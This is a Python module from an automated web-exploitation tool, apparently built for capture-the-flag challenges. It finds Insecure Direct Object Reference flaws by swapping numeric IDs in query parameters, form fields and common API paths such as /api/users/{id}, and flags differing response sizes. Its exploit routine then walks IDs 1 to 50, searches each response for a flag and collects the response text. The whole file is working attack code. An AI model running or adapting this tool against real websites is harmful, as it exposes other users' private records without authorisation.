"""
EnoughOfWeb — Insecure Direct Object Reference (IDOR) Module
Numeric ID enumeration, response size anomaly detection, path-based IDOR.
"""

import re
from typing import List, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from modules.base import BaseExploit, Finding, ExploitResult, Severity


# ── Parameter names likely to hold object IDs ─────────────────────────────
IDOR_PARAM_NAMES = {
    "id", "uid", "user_id", "userid", "user", "account", "account_id",
    "profile", "profile_id", "doc", "doc_id", "document_id", "file_id",
    "order", "order_id", "invoice", "invoice_id", "report", "report_id",
    "item", "item_id", "product", "product_id", "post", "post_id",
    "comment_id", "msg_id", "message_id", "ticket", "ticket_id",
    "num", "number", "no",
}

# ── Path patterns for path-based IDOR ─────────────────────────────────────
PATH_IDOR_PATTERNS = [
    "/api/users/{id}",
    "/api/user/{id}",
    "/api/profile/{id}",
    "/api/account/{id}",
    "/api/orders/{id}",
    "/api/documents/{id}",
    "/api/files/{id}",
    "/api/messages/{id}",
    "/api/v1/users/{id}",
    "/api/v2/users/{id}",
    "/user/{id}",
    "/users/{id}",
    "/profile/{id}",
    "/account/{id}",
    "/download/{id}",
    "/file/{id}",
    "/view/{id}",
    "/read/{id}",
    "/document/{id}",
]


class IDORExploit(BaseExploit):
    name = "idor"
    description = "Insecure Direct Object Reference — ID enumeration, response anomaly detection"
    priority = 8

    def detect(self, target_url: str, recon_data: dict) -> List[Finding]:
        findings: List[Finding] = []

        # Strategy 1: Parameter-based IDOR
        param_findings = self._detect_param_idor(target_url, recon_data)
        findings.extend(param_findings)

        # Strategy 2: Path-based IDOR
        path_findings = self._detect_path_idor(target_url, recon_data)
        findings.extend(path_findings)

        return findings

    def exploit(self, finding: Finding) -> ExploitResult:
        try:
            return self._exploit_idor(finding)
        except Exception as e:
            return ExploitResult(success=False, error=str(e))

    # ── Detection ─────────────────────────────────────────────────────────

    def _detect_param_idor(self, target_url, recon_data) -> List[Finding]:
        findings = []

        # Find ID-like parameters in URL and forms
        injection_points = []

        for p in recon_data.get("parameters", []):
            if p["name"].lower() in IDOR_PARAM_NAMES:
                injection_points.append({
                    "url": p.get("url", target_url),
                    "param": p["name"],
                    "method": "GET" if p.get("location") == "url" else "POST",
                })

        for form in recon_data.get("forms", []):
            form_url = urljoin(target_url, form.get("action", ""))
            for inp_name in form.get("inputs", {}):
                if inp_name.lower() in IDOR_PARAM_NAMES:
                    injection_points.append({
                        "url": form_url,
                        "param": inp_name,
                        "method": form.get("method", "POST").upper(),
                        "base_data": dict(form.get("inputs", {})),
                    })

        # Also check URL for numeric segments that could be IDs
        parsed = urlparse(target_url)
        qs = parse_qs(parsed.query)
        for param_name, values in qs.items():
            if values and values[0].isdigit():
                injection_points.append({
                    "url": target_url,
                    "param": param_name,
                    "method": "GET",
                })

        for point in injection_points:
            finding = self._test_idor(point)
            if finding:
                findings.append(finding)

        return findings

    def _detect_path_idor(self, target_url, recon_data) -> List[Finding]:
        findings = []
        parsed = urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Check if any discovered links have numeric path segments
        for link in recon_data.get("links", []):
            segments = link.strip("/").split("/")
            for i, seg in enumerate(segments):
                if seg.isdigit():
                    # Try replacing the numeric segment with other IDs
                    finding = self._test_path_idor(base, link, i, int(seg))
                    if finding:
                        findings.append(finding)
                        break  # One finding per link

        # Try common API patterns
        for pattern in PATH_IDOR_PATTERNS[:6]:
            test_url = base + pattern.replace("{id}", "1")
            try:
                resp = self._request("GET", test_url)
                if resp.status_code == 200 and len(resp.text) > 20:
                    # This pattern exists, test for IDOR
                    finding = self._test_path_idor_direct(base, pattern)
                    if finding:
                        findings.append(finding)
            except Exception:
                continue

        return findings

    def _test_idor(self, point) -> Optional[Finding]:
        """Test a parameter for IDOR by trying different ID values."""
        url = point["url"]
        param = point["param"]
        method = point["method"]
        base_data = point.get("base_data", {})

        responses = {}
        for test_id in range(1, 6):  # Test IDs 1-5
            try:
                if method == "GET":
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    qs[param] = [str(test_id)]
                    new_query = urlencode(qs, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    resp = self._request("GET", test_url)
                else:
                    data = dict(base_data)
                    data[param] = str(test_id)
                    resp = self._request("POST", url, data=data)

                if resp.status_code == 200:
                    responses[test_id] = {
                        "size": len(resp.text),
                        "text": resp.text[:500],
                    }
            except Exception:
                continue

        if len(responses) < 2:
            return None

        # Analyze: multiple different response sizes = different objects = IDOR
        sizes = [r["size"] for r in responses.values()]
        unique_sizes = set(sizes)

        if len(unique_sizes) > 1:
            return Finding(
                module=self.name,
                vuln_type="idor-parameter",
                target_url=url,
                parameter=param,
                method=method,
                payload=f"{param}=1..5",
                evidence=f"Different response sizes for different IDs: {dict(zip(responses.keys(), sizes))}",
                severity=Severity.HIGH,
                extra={
                    "responses": responses,
                    "base_data": base_data,
                    "id_range_tested": list(responses.keys()),
                },
            )

        return None

    def _test_path_idor(self, base_url, path, segment_index, current_id) -> Optional[Finding]:
        """Test path-based IDOR by replacing numeric segment."""
        segments = path.strip("/").split("/")
        responses = {}

        for test_id in range(max(1, current_id - 2), current_id + 3):
            new_segments = segments.copy()
            new_segments[segment_index] = str(test_id)
            test_url = base_url + "/" + "/".join(new_segments)

            try:
                resp = self._request("GET", test_url)
                if resp.status_code == 200:
                    responses[test_id] = len(resp.text)
            except Exception:
                continue

        if len(responses) >= 2 and len(set(responses.values())) > 1:
            return Finding(
                module=self.name,
                vuln_type="idor-path",
                target_url=base_url + "/" + "/".join(segments),
                parameter=f"path_segment[{segment_index}]",
                method="GET",
                payload=f"IDs {min(responses.keys())}-{max(responses.keys())}",
                evidence=f"Path IDOR: different sizes for different IDs: {responses}",
                severity=Severity.HIGH,
                extra={"path": path, "segment_index": segment_index, "responses": responses},
            )

        return None

    def _test_path_idor_direct(self, base_url, pattern) -> Optional[Finding]:
        """Test a URL pattern like /api/users/{id} for IDOR."""
        responses = {}

        for test_id in range(1, 6):
            test_url = base_url + pattern.replace("{id}", str(test_id))
            try:
                resp = self._request("GET", test_url)
                if resp.status_code == 200:
                    responses[test_id] = {"size": len(resp.text), "text": resp.text[:500]}
            except Exception:
                continue

        if len(responses) >= 2 and len(set(r["size"] for r in responses.values())) > 1:
            return Finding(
                module=self.name,
                vuln_type="idor-api-path",
                target_url=base_url + pattern,
                parameter="path_id",
                method="GET",
                payload=pattern,
                evidence=f"API IDOR: {len(responses)} accessible objects",
                severity=Severity.HIGH,
                extra={"pattern": pattern, "responses": responses},
            )

        return None

    # ── Exploitation ──────────────────────────────────────────────────────

    def _exploit_idor(self, finding: Finding) -> ExploitResult:
        url = finding.target_url
        param = finding.parameter
        method = finding.method
        base_data = finding.extra.get("base_data", {})
        all_data = []

        if finding.vuln_type == "idor-parameter":
            # Enumerate more IDs (1-50)
            for test_id in range(1, 51):
                try:
                    if method == "GET":
                        parsed = urlparse(url)
                        qs = parse_qs(parsed.query, keep_blank_values=True)
                        qs[param] = [str(test_id)]
                        new_query = urlencode(qs, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        resp = self._request("GET", test_url)
                    else:
                        data = dict(base_data)
                        data[param] = str(test_id)
                        resp = self._request("POST", url, data=data)

                    if resp.status_code != 200:
                        continue

                    flag = self._check_flag(resp.text)
                    if flag:
                        return ExploitResult(
                            success=True, flag=flag,
                            payload_used=f"{param}={test_id}",
                            technique="idor-enum",
                        )

                    all_data.append(f"[ID={test_id}] size={len(resp.text)} | {resp.text[:100]}")
                except Exception:
                    continue

        elif finding.vuln_type in ("idor-path", "idor-api-path"):
            pattern = finding.extra.get("pattern", "")
            path = finding.extra.get("path", "")
            segment_index = finding.extra.get("segment_index", 0)
            parsed_base = urlparse(url)
            base = f"{parsed_base.scheme}://{parsed_base.netloc}"

            for test_id in range(1, 51):
                if pattern:
                    test_url = base + pattern.replace("{id}", str(test_id))
                elif path:
                    segments = path.strip("/").split("/")
                    segments[segment_index] = str(test_id)
                    test_url = base + "/" + "/".join(segments)
                else:
                    continue

                try:
                    resp = self._request("GET", test_url)
                    if resp.status_code != 200:
                        continue
                    flag = self._check_flag(resp.text)
                    if flag:
                        return ExploitResult(
                            success=True, flag=flag,
                            payload_used=test_url,
                            technique="idor-path-enum",
                        )
                    all_data.append(f"[ID={test_id}] {resp.text[:100]}")
                except Exception:
                    continue

        return ExploitResult(
            success=bool(all_data),
            payload_used=finding.payload,
            technique=finding.vuln_type,
            data_extracted="\n".join(all_data[:20]) if all_data else None,
        )
